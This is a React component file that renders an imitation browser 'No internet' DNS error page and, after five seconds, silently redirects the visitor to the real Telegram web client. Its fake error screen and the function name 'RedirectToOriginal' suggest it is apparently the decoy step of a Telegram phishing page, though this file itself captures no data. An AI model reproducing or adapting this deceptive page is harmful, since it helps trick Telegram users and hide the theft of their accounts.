import { useEffect } from 'react';
import styles from './Error.module.css';

function Error() {
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const delayFiveSecAndRedirectToOriginal = async () => {
    await delay(5000);

    window.location.replace("https://web.telegram.org/a/");
  };

  useEffect(()=>{delayFiveSecAndRedirectToOriginal();});
  return (
    <div className={styles.error}>
        <div className={styles.mainFrameError}>
            <div className={styles.mainContent}>
                <div className={styles.mainIcon}></div>
                <div className={styles.mainMessage}>
                    <h1>No internet</h1>
                    <p>No internet</p>
                </div>
                <div className={styles.errorInfo}>
                    <p style={{marginBottom: "0px"}}>Try:</p>
                    <ul>
                        <li>Checking the network cables, modem, and router</li>
                        <li>Reconnecting to Wi-Fi</li>
                        <li>Running Windows Network Diagnostics</li>
                    </ul>
                    <div className={styles.errorCode}>DNS_PROBE_FINISHED_NO_INTERNET</div>
                </div>
            </div>
        </div>
    </div>
  );
}

export default Error;